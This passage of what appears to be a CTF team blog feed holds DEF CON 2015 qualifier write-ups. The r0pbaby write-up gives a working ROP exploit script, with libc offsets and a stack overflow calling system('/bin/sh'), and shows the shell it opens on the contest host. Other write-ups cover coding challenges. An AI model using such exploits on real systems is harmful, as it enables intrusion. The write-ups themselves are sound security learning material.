</span><span class='line'>  dlclose(handle);
</span><span class='line'>  puts("Exiting.");
</span><span class='line'>  return 0LL;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>After resolving symbols we can use third menu to overflow and execute our chain.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file ./r0pbaby_542ee6516410709a1421141501f03760
</span><span class='line'>./r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
</span><span class='line'>$ checksec.sh --file ./r0pbaby_542ee6516410709a1421141501f03760
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./r0pbaby_542ee6516410709a1421141501f03760
</span></code></pre></td></tr></table></div></figure>


<p>but there may be a problem since we don&rsquo;t have the <code>libc.so.6</code>. but we have, don&rsquo;t we? :)
i used the libc&rsquo;s version of the <code>babycmd</code> challenge.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./lib/x86_64-linux-gnu/libc.so.6 
</span><span class='line'>GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release version 2.19, by Roland McGrath et al.
</span><span class='line'>Copyright (C) 2014 Free Software Foundation, Inc.</span></code></pre></td></tr></table></div></figure>


<p>so you can find it here: [<a href="http://packages.ubuntu.com/trusty/libc6">http://packages.ubuntu.com/trusty/libc6</a>]</p>

<p>** note: just use LD_LIBRARY_PATH to use this version to implement the attack completely.</p>

<p>Then i found the offset of <code>/bin/sh</code> and <code>pop rdi; ret</code> from the <code>system</code> symbols of the our given <code>libc.so.6</code> as you can see below:<br/>
  * /bin/sh offset from system: +0x13669b<br/>
  * pop rdi; ret offset from system: -0x23b26</p>

<p>you can see my implementation here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
</span><span class='line'>
</span><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>import telnetlib
</span><span class='line'>
</span><span class='line'>def readuntil(f, delim=': '):
</span><span class='line'>    data = ''
</span><span class='line'>    while not data.endswith(delim):
</span><span class='line'>        c = f.read(1)
</span><span class='line'>        assert len(c) &gt; 0
</span><span class='line'>        data += c
</span><span class='line'>    #print data
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def p(v):
</span><span class='line'>    return struct.pack('&lt;Q', v)
</span><span class='line'>
</span><span class='line'>def u(v):
</span><span class='line'>    return struct.unpack('&lt;Q', v)[0]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 1337))
</span><span class='line'>s = socket.create_connection(("r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me", 10436))
</span><span class='line'>f = s.makefile('rw', bufsize=0)
</span><span class='line'>
</span><span class='line'>raw_input("$") # attach debugger
</span><span class='line'>
</span><span class='line'>print s.recv(1024)
</span><span class='line'>f.write("1\n")
</span><span class='line'>readuntil(f, "0x")
</span><span class='line'>a = f.read(16)
</span><span class='line'>print a
</span><span class='line'>libc = int(a, 16)
</span><span class='line'>
</span><span class='line'>f.write("2\nsystem\n")
</span><span class='line'>readuntil(f, "0x")
</span><span class='line'>system = int(f.read(16), 16)
</span><span class='line'>print hex(system)
</span><span class='line'>
</span><span class='line'>f.write("3\n32\n"+"A"*8+p(system-0x23b26)+p(system+0x13669b)+p(system)+"\n")
</span><span class='line'>
</span><span class='line'>print "[+] shell is ready: "
</span><span class='line'>t = telnetlib.Telnet()
</span><span class='line'>t.sock = s
</span><span class='line'>t.interact()
</span></code></pre></td></tr></table></div></figure>


<p>and launching the attack:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python r0pbaby-expl.py 
</span><span class='line'>$
</span><span class='line'>
</span><span class='line'>Welcome to an easy Return Oriented Programming challenge...
</span><span class='line'>Menu:
</span><span class='line'>1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: 
</span><span class='line'>00007F9F01F43AB0
</span><span class='line'>0x7f9f0179f640
</span><span class='line'>[+] shell is ready: 
</span><span class='line'>
</span><span class='line'>1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: Enter bytes to send (max 1024): 1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: Bad choice.
</span><span class='line'>ls
</span><span class='line'>bin
</span><span class='line'>boot
</span><span class='line'>[..]
</span><span class='line'>cat /home/r0pbaby/flag
</span><span class='line'>The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?</span></code></pre></td></tr></table></div></figure>


<p>And another 1 point. Thanks #defconctf</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Catwestern Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/"/>
    <updated>2015-05-18T14:19:44+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 Catwestern Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Coding</strong></p>

<blockquote><p>Catwestern
meow catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me 9999</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me 9999
</span><span class='line'>****Initial Register State****
</span><span class='line'>rax=0x33d34005adc0a57c
</span><span class='line'>rbx=0xe318943106ae1bf9
</span><span class='line'>rcx=0x805e3dd411fbc177
</span><span class='line'>rdx=0x9a951fd093fea167
</span><span class='line'>rsi=0xdecde15b09b2a5f5
</span><span class='line'>rdi=0x8c1473d5803b0f4c
</span><span class='line'>r8=0xf38da8ac64cb3b981
</span><span class='line'>r9=0xda321f211f484523
</span><span class='line'>r10=0xadb76e93d0e8fd1e
</span><span class='line'>r11=0x54acc124703437a
</span><span class='line'>r12=0x6ba39546c9366ffa
</span><span class='line'>r13=0x2250452bedb3e99a
</span><span class='line'>r14=0x525e1ed890af328e
</span><span class='line'>r15=0xdfcbd919b08f5cbe
</span><span class='line'>****Send Solution In The Same Format****
</span><span class='line'>About to send 65 bytes: 
</span><span class='line'>H��I�s �H��)o�zL)�I��� �^M!�I��M �H��M��I��H��I��</span></code></pre></td></tr></table></div></figure>


<p>So we should set these initial registers and execute opcodes and send the solution.</p>

<p>For solution i created <code>d.s</code> file in the following format:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.globl  _start
</span><span class='line'>_start:
</span><span class='line'>    movq $0x2222222222222222, %rax
</span><span class='line'>    movq $0x3333333333333333, %rbx
</span><span class='line'>    movq $0x4444444444444444, %rcx
</span><span class='line'>    movq $0x5555555555555555, %rdx
</span><span class='line'>    movq $0x6666666666666666, %rsi
</span><span class='line'>    movq $0x7777777777777777, %rdi
</span><span class='line'>    movq $0x8888888888888888, %r8
</span><span class='line'>    movq $0x9999999999999999, %r9
</span><span class='line'>    movq $0xaaaaaaaaaaaaaaaa, %r10
</span><span class='line'>    movq $0xbbbbbbbbbbbbbbbb, %r11
</span><span class='line'>    movq $0xcccccccccccccccc, %r12
</span><span class='line'>    movq $0xdddddddddddddddd, %r13
</span><span class='line'>    movq $0xeeeeeeeeeeeeeeee, %r14
</span><span class='line'>    movq $0xffffffffffffffff, %r15
</span><span class='line'>    nop
</span><span class='line'>    nop
</span><span class='line'>    nop
</span><span class='line'>    nop
</span><span class='line'>    nop
</span><span class='line'>    nop
</span><span class='line'>    ...
</span><span class='line'>    nop
</span></code></pre></td></tr></table></div></figure>


<p>about 100 nops.</p>

<p>i just read the initial registers and replace with these constants and the assemble and link the binary.
after that i read the opcodes and write them from 0x105 offset to the executable file.
after that i use <code>python-ptrace</code> to create child and trace the binary execution, and after recvieving SIGSEGV signal i read the registers and send to the server at the same format.</p>

<p>you can see my python script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
</span><span class='line'> 
</span><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>import telnetlib
</span><span class='line'>from ptrace.debugger.debugger import PtraceDebugger
</span><span class='line'>from ptrace.debugger.child import createChild
</span><span class='line'>from ptrace.tools import locateProgram
</span><span class='line'>from sys import stderr, argv, exit
</span><span class='line'>from subprocess import call
</span><span class='line'>from hexdump import hexdump
</span><span class='line'>
</span><span class='line'>def readuntil(f, delim=': '):
</span><span class='line'>    data = ''
</span><span class='line'>    while not data.endswith(delim):
</span><span class='line'>        c = f.read(1)
</span><span class='line'>        assert len(c) &gt; 0
</span><span class='line'>        data += c
</span><span class='line'>    #print data
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def p(v):
</span><span class='line'>    return struct.pack('&lt;Q', v)
</span><span class='line'>
</span><span class='line'>def u(v):
</span><span class='line'>    return struct.unpack('&lt;Q', v)[0]
</span><span class='line'>
</span><span class='line'>def traceProgram(arguments):
</span><span class='line'>    env = None
</span><span class='line'>    arguments1 = [str] * 2
</span><span class='line'>    arguments1[0] = locateProgram(arguments)
</span><span class='line'>    arguments1[1] = arguments[2:]
</span><span class='line'>    #print arguments1
</span><span class='line'>    return createChild(arguments1, False, env)
</span><span class='line'>  
</span><span class='line'>  
</span><span class='line'>def playWithProcess(process):
</span><span class='line'>    process.cont()
</span><span class='line'>    event = process.waitEvent()
</span><span class='line'>    print "New process event: %s" % event
</span><span class='line'>    process.dumpRegs()
</span><span class='line'>     
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>s = socket.create_connection(("catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me", 9999))
</span><span class='line'>f = s.makefile('rw', bufsize=0)
</span><span class='line'>
</span><span class='line'>raw_input("$") # attach debugger
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>a = readuntil(f, "Format")
</span><span class='line'>print a
</span><span class='line'>a = a.split('\n')[1:-1]
</span><span class='line'>print a
</span><span class='line'>call(["cp", "./d.s.b", "./d.s"])
</span><span class='line'>
</span><span class='line'>f1 = open("./d.s", "r")
</span><span class='line'>b = f1.read()
</span><span class='line'>f1.close()
</span><span class='line'>print b
</span><span class='line'>b = b.replace("0x2222222222222222", a[0].replace("rax=", ""))
</span><span class='line'>b = b.replace("0x3333333333333333", a[1].replace("rbx=", ""))
</span><span class='line'>b = b.replace("0x4444444444444444", a[2].replace("rcx=", ""))
</span><span class='line'>b = b.replace("0x5555555555555555", a[3].replace("rdx=", ""))
</span><span class='line'>b = b.replace("0x6666666666666666", a[4].replace("rsi=", ""))
</span><span class='line'>b = b.replace("0x7777777777777777", a[5].replace("rdi=", ""))
</span><span class='line'>b = b.replace("0x8888888888888888", a[6].replace("r8=", ""))
</span><span class='line'>b = b.replace("0x9999999999999999", a[7].replace("r9=", ""))
</span><span class='line'>b = b.replace("0xaaaaaaaaaaaaaaaa", a[8].replace("r10=", ""))
</span><span class='line'>b = b.replace("0xbbbbbbbbbbbbbbbb", a[9].replace("r11=", ""))
</span><span class='line'>b = b.replace("0xcccccccccccccccc", a[10].replace("r12=", ""))
</span><span class='line'>b = b.replace("0xdddddddddddddddd", a[11].replace("r13=", ""))
</span><span class='line'>b = b.replace("0xeeeeeeeeeeeeeeee", a[12].replace("r14=", ""))
</span><span class='line'>b = b.replace("0xffffffffffffffff", a[13].replace("r15=", ""))
</span><span class='line'>print b
</span><span class='line'>
</span><span class='line'>f1 = open("./d.s", "w")
</span><span class='line'>f1.write(b)
</span><span class='line'>f1.close()
</span><span class='line'>
</span><span class='line'>call(["as", "./d.s", "-o", "d"])
</span><span class='line'>call(["ld", "-s", "./d", "-o", "./dm"])
</span><span class='line'>
</span><span class='line'>a = readuntil(f, ":")
</span><span class='line'>print a
</span><span class='line'>l = int(a.split(" ")[3])
</span><span class='line'>s.recv(2)
</span><span class='line'>print "len : ", l
</span><span class='line'>
</span><span class='line'>opcode = s.recv(l)
</span><span class='line'>
</span><span class='line'>print hexdump(opcode)
</span><span class='line'>
</span><span class='line'>f1 = open("./dm", "r+")
</span><span class='line'>f1.seek(0x105)
</span><span class='line'>f1.write(opcode)
</span><span class='line'>f1.close()
</span><span class='line'>
</span><span class='line'>pid = traceProgram("./dm")
</span><span class='line'>print pid
</span><span class='line'>
</span><span class='line'>dbg = PtraceDebugger()
</span><span class='line'>is_attached = True
</span><span class='line'>process = dbg.addProcess(pid, is_attached)
</span><span class='line'>
</span><span class='line'>playWithProcess(process)
</span><span class='line'>answer = "rax=0x%x\n" % process.getreg('rax')
</span><span class='line'>answer += "rbx=0x%x\n" % process.getreg('rbx')
</span><span class='line'>answer += "rcx=0x%x\n" % process.getreg('rcx')
</span><span class='line'>answer += "rdx=0x%x\n" % process.getreg('rdx')
</span><span class='line'>answer += "rsi=0x%x\n" % process.getreg('rsi')
</span><span class='line'>answer += "rdi=0x%x\n" % process.getreg('rdi')
</span><span class='line'>answer += "r8=0x%x\n" % process.getreg('r8')
</span><span class='line'>answer += "r9=0x%x\n" % process.getreg('r9')
</span><span class='line'>answer += "r10=0x%x\n" % process.getreg('r10')
</span><span class='line'>answer += "r11=0x%x\n" % process.getreg('r11')
</span><span class='line'>answer += "r12=0x%x\n" % process.getreg('r12')
</span><span class='line'>answer += "r13=0x%x\n" % process.getreg('r13')
</span><span class='line'>answer += "r14=0x%x\n" % process.getreg('r14')
</span><span class='line'>answer += "r15=0x%x\n" % process.getreg('r15')
</span><span class='line'>print answer
</span><span class='line'>f.write(answer)
</span><span class='line'>dbg.quit()
</span><span class='line'>
</span><span class='line'>print "[+] shell is ready: "
</span><span class='line'>t = telnetlib.Telnet()
</span><span class='line'>t.sock = s
</span><span class='line'>t.interact()
</span><span class='line'>
</span><span class='line'>#s.close()</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s not so beatiful code :)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python coding-sol.py
</span><span class='line'>[..]
</span><span class='line'>r14=0x20f838e6af11cbb2
</span><span class='line'>r15=0x5c1e33373ff7f37c
</span><span class='line'>
</span><span class='line'>WARNING:root:Terminate &lt;PtraceProcess #5651&gt;
</span><span class='line'>[+] shell is ready:
</span><span class='line'>
</span><span class='line'>The flag is: Cats with frickin lazer beamz on top of their heads!
</span><span class='line'>*** Connection closed by remote host ***</span></code></pre></td></tr></table></div></figure>


<p>Here another point, but really i assumed i should do this multiple times :)</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Mathwize Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/"/>
    <updated>2015-05-18T14:00:56+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 Mathwize Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Coding</strong></p>

<p>We just given the dest address.</p>

<blockquote><p>mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me:21249</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me 21249
</span><span class='line'>1 + 1 =
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s seems we should just answer all the questions.</p>

<p>but among using a script to answer all, i see following patterns:</p>

<ol>
<li>using [ and ]  instead of (, )</li>
<li>using { , } instead of (, )</li>
<li>using ONE, TWO, THREE, instead of 1, 2, 3</li>
</ol>


<p>So here is my completely dirty solution :) :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>s = socket.create_connection(("mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me", 21249))
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>while True:
</span><span class='line'>    a = s.recv(1024)
</span><span class='line'>    print a
</span><span class='line'>    b = eval(a.replace("=", "").replace("{", "(").replace("}", ")").replace("ONE", "1").replace("TWO", "2").replace("THREE", "3").replace("^", "**").replace("[", "(").replace("]", ")"))
</span><span class='line'>    print b
</span><span class='line'>    s.send(str(b)+"\n")
</span></code></pre></td></tr></table></div></figure>


<p>And finally:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python mathwize-sol.py
</span><span class='line'>[..]
</span><span class='line'>
</span><span class='line'>You won!!!
</span><span class='line'>The flag is: Farva says you are a FickenChucker and you'd better watch Super Troopers 2</span></code></pre></td></tr></table></div></figure>


<p>another 1 point ;)</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babycmd Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/"/>
    <updated>2015-05-18T13:39:52+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycmd Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>As you may now defconctf started 2 days ago, so we participated and you can check our solutions right here.</p>

<p>OK, So there was 4 problem categories: <code>Baby's first</code>,  <code>Pwning</code>, <code>Coding</code>, <code>Reverse</code> and <code>Misc</code>.</p>

<p>This is babycmd writeup as you can see below,</p>

<p>&ndash;</p>

<p>There was a binary <code>babycmd_3ad28b10e8ab283d7df81795075f600b</code> by following properties:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file babycmd_3ad28b10e8ab283d7df81795075f600b
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
</span><span class='line'>$ checksec.sh --file babycmd_3ad28b10e8ab283d7df81795075f600b 
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babycmd_3ad28b10e8ab283d7df81795075f600b</span></code></pre></td></tr></table></div></figure>


<p>This is so much for 1 point task, but you know this is DEFCON.</p>

<!--more-->


<p>by running the binary, it was a wrapper providing 3 functionalites: <code>ping</code>, <code>host</code>, <code>dig</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
</span><span class='line'>
</span><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: ping 8.8.8.8
</span><span class='line'>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
</span><span class='line'>
</span><span class='line'>--- 8.8.8.8 ping statistics ---
</span><span class='line'>3 packets transmitted, 0 received, 100 0x56191abe7100acket loss, time 2016ms          
</span><span class='line'>                                                                                      
</span><span class='line'>Commands: ping, dig, host, exit                                                       
</span><span class='line'>: host hamidx9.ir
</span><span class='line'>hamidx9.ir has address 104.28.29.35
</span><span class='line'>hamidx9.ir has address 104.28.28.35
</span><span class='line'>hamidx9.ir has IPv6 address 2400:cb00:2048:1::681c:1c23
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: 
</span></code></pre></td></tr></table></div></figure>


<p>as strace says, it seems it parses the input and filter it and then try to execute!</p>

<p>Basicly with <code>executing</code> word i always look for a filter bypass and execute arbitrary commands. but <code>0x56191abe7100acket</code> in the ping command got my attention.</p>

<p>It&rsquo;s time to open the binary in IDA:</p>

<ol>
<li><p>6 main functions:<br/>
<code>sub_F5C</code>: parse and execute dig<br/>
<code>sub_10BD</code>: parse and execute host<br/>
